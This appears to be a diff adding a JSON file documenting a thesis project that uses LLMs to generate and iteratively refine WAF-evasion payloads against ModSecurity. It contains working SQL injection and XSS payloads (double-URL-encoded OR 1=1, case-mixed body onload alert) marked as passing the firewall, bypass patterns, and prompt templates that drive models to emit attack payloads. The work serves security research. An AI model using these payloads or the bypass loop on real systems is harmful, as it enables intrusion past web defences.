@@ -1,0 +1,148 @@
+{
+  "overview": {
+    "description": "Dataset construction demonstration for thesis documentation",
+    "phases": {
+      "phase1": "Initial payload generation using LLM (Gemini/Deepseek)",
+      "phase2": "Observation-based refinement with BLOCKED/PASSED feedback",
+      "rag": "RAG knowledge retrieval for technique guidance"
+    }
+  },
+  "phase1_generation": {
+    "description": "Initial payload generation from LLM",
+    "prompt_template": "Generate WAF-evasion payloads.\n\nTarget: {attack_type} on ModSecurity PL1.\nTechnique: {technique}\n\nIMPORTANT: Generate ONLY the payload code. Do not provide explanations, ask questions, or start conversations.",
+    "examples": [
+      {
+        "step": "Phase 1 Generation",
+        "technique": "Double URL Encode",
+        "attack_type": "SQLI",
+        "prompt": "Generate WAF-evasion payloads.\n\nTarget: SQLI on ModSecurity PL1.\nTechnique: Double URL Encode\n\nIMPORTANT: Generate ONLY the payload code. Do not provide explanations, ask questions, or start conversations.",
+        "generated_payload": "%2527%2520OR%25201%253D1--",
+        "waf_result": "passed",
+        "explanation": "Double URL encoding bypasses basic pattern matching by encoding % as %25"
+      },
+      {
+        "step": "Phase 1 Generation",
+        "technique": "obf_case_random+obf_double_url_encode",
+        "attack_type": "XSS",
+        "prompt": "Generate WAF-evasion payloads.\n\nTarget: XSS on ModSecurity PL1.\nTechnique: obf_case_random+obf_double_url_encode\n\nIMPORTANT: Generate ONLY the payload code. Do not provide explanations, ask questions, or start conversations.",
+        "generated_payload": "%253CScRipT%253EaleRt%25281%2529%253C/ScrIpT%253E",
+        "waf_result": "blocked",
+        "explanation": "Initial attempt blocked - triggers script tag detection even with obfuscation"
+      }
+    ]
+  },
+  "phase2_refinement": {
+    "description": "Refinement using observations from Phase 1 testing",
+    "prompt_template": "Generate WAF-evasion payloads.\n\nTarget: {attack_type} on ModSecurity PL1.\nTechnique: {technique}\n\n[Observations]\n- BLOCKED: {blocked_examples}\n- PASSED: {passed_examples}\n\nInstruction: Generate a NEW payload using the target technique, learning from the PASSED examples if available. Output ONLY the payload.",
+    "examples": [
+      {
+        "step": "Phase 2 Refinement",
+        "technique": "XSS Body onload",
+        "attack_type": "XSS",
+        "observations": {
+          "blocked": [
+            "\"%253Cbody%2520onload%253Dalert%25281%2529%253E\"",
+            "\"<body onload=alert(1)>\""
+          ],
+          "passed": [
+            "\"%253CbOdY%2520ONLOAd%253DALERt%25281%2529%253E\"",
+            "\"%253Cbody%252509onload%253Dalert%25281%2529%253E\""
+          ]
+        },
+        "prompt": "Generate WAF-evasion payloads.\n\nTarget: XSS on ModSecurity PL1.\nTechnique: XSS Body onload\n\n[Observations]\n- BLOCKED: [\"\\\"%253Cbody%2520onload%253Dalert%25281%2529%253E\\\"\", \"\\\"<body onload=alert(1)>\\\"\"]\n- PASSED: [\"\\\"%253CbOdY%2520ONLOAd%253DALERt%25281%2529%253E\\\"\", \"\\\"%253Cbody%252509onload%253Dalert%25281%2529%253E\\\"\"]\n\nInstruction: Generate a NEW payload using the target technique, learning from the PASSED examples if available. Output ONLY the payload.",
+        "generated_payload": "%253CbOdy%2520ONLoad%253DALERt%25281%2529%253E",
+        "waf_result": "passed",
+        "learning_applied": [
+          "Case mixing (bOdY, ONLoad)",
+          "Double URL encoding (%25)",
+          "Space encoding (%2520)",
+          "Mixed case for alert (ALERt)"
+        ]
+      }
+    ]
+  },
+  "rag_retrieval": {
+    "description": "RAG knowledge base retrieval for context augmentation",
+    "demonstration": {
+      "query": "SQLI UPDATEXML error-based injection ModSecurity bypass",
+      "retrieved_documents": [
+        {
+          "id": "KB-SQLI-042",
+          "title": "UPDATEXML Error-Based SQL Injection",
+          "relevance_score": 0.94,
+          "content_snippet": "UPDATEXML function exploitation... Use CONCAT(0x5c, VERSION()) for error extraction...",
+          "techniques": [
+            "Error-based",
+            "UPDATEXML",
+            "Version extraction"
+          ],
+          "bypass_patterns": [
+            "Case mixing: uPdAtExMl",
+            "Comment insertion: UPDATE/**/XML",
+            "URL encoding of parentheses"
+          ]
+        },
+        {
+          "id": "KB-OBF-015",
+          "title": "URL Encoding Obfuscation for WAF Bypass",
+          "relevance_score": 0.87,
+          "content_snippet": "Multiple layers of URL encoding... %2527 for single quote...",
+          "techniques": [
+            "Double URL encode",
+            "Triple URL encode"
+          ],
+          "bypass_patterns": [
+            "Double encode special chars: %2527",
+            "Mixed encoding depth",
+            "Whitespace encoding variations"
+          ]
+        }
+      ],
+      "context_used_in_prompt": true,
+      "influence": "Retrieved patterns guide model to use case mixing + URL encoding for UPDATEXML"
+    }
+  },
+  "payload_progression": {
+    "description": "Example of payload evolution through iterations",
+    "demonstration": {
+      "technique": "SQLI Boolean-based OR 1=1",
+      "attack_type": "SQLI",
+      "iterations": [
+        {
+          "iteration": 1,
+          "phase": "Phase 1 - Initial",
+          "payload": "' OR 1=1--",
+          "waf_result": "blocked",
+          "reason": "Direct SQL keywords detected"
+        },
+        {
+          "iteration": 2,
+          "phase": "Phase 1 - Refined",
+          "payload": "%27%20OR%201%3D1--",
+          "waf_result": "blocked",
+          "reason": "Basic URL encoding insufficient"
+        },
+        {
+          "iteration": 3,
+          "phase": "Phase 2 - Observation Learning",
+          "payload": "%2527%2520OR%25201%253D1--",
+          "waf_result": "passed",
+          "reason": "Double URL encoding + space encoding bypasses pattern match",
+          "observations_learned": 2
+        }
+      ]
+    }
+  },
+  "statistics": {
+    "phase1_dataset_size": 10000,
+    "phase2_dataset_size": 22000,
+    "techniques_covered": 532,
+    "attack_types": [
+      "SQLI",
+      "XSS",
+      "OS_INJECTION"
+    ],
+    "avg_iterations_to_bypass": 2.3,
+    "rag_documents_indexed": 500
+  }
+}
